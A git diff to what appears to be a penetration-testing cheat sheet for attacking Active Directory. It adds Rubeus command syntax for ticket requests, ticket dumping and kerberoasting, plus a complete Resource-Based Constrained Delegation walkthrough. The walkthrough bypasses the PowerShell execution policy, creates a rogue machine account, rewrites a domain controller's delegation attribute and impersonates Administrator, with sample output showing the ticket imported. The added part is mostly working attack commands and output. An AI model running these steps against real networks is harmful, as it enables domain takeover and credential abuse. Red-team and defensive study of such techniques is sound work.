@@ -98,6 +98,16 @@
     ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
     ```
 
+* [Rubeus](https://github.com/GhostPack/Rubeus)
+
+    ```powershell
+    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
+    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+    Rubeus.exe klist [/luid:LOGINID]
+    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+    ```
+
+
 ## Most common paths to AD compromise
 
 ### MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)
@@ -657,7 +667,77 @@ Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HAC
 
 ### Resource-Based Constrained Delegation
 
-TODO
+1. Import **Powermad** and **Powerview**
+
+    ```powershell
+    PowerShell.exe -ExecutionPolicy Bypass
+    Import-Module .\powermad.ps1
+    Import-Module .\powerview.ps1
+    ```
+
+2. Get user SID
+
+    ```powershell
+    $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
+    $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
+    $ACE
+    ConvertFrom-SID $ACE.SecurityIdentifier
+    ```
+
+3. Abuse **MachineAccountQuota** to create a computer account and set an SPN for it
+
+    ```powershell
+    New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
+    ```
+
+4. Rewrite DC's **AllowedToActOnBehalfOfOtherIdentity** properties
+
+    ```powershell
+    $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
+
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+    $SD.GetBinaryForm($SDBytes, 0)
+    Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+    $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+    $Descriptor.DiscretionaryAcl
+    ```
+
+5. Use Rubeus to get hash from password
+
+    ```powershell
+    Rubeus.exe hash /password:'Weakest123*' /user:swktest  /domain:factory.lan
+    [*] Input password             : Weakest123*
+    [*] Input username             : swktest
+    [*] Input domain               : factory.lan
+    [*] Salt                       : FACTORY.LANswktest
+    [*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
+    [*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
+    [*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
+    [*]       des_cbc_md5          : BA297CFD07E62A5E
+    ```
+
+6. Impersonate domain admin using our newly created machine account
+
+    ```powershell
+    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt
+
+    [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
+    [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
+    [*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
+    [*] Sending S4U2proxy request
+    [+] S4U2proxy success!
+    [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':
+
+        doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
+        AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
+        LmZhY3RvcnkubGFu
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+    ```
+
 
 ### PrivExchange attack
 
@@ -724,7 +804,8 @@ Most of the time the best passwords to spray are :
 
 ## References
 
-* [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
+* [BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
+* [Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html)
 * [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
@@ -765,3 +846,5 @@ Most of the time the best passwords to spray are :
 * [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
 * [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
 * [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
+* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
+* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
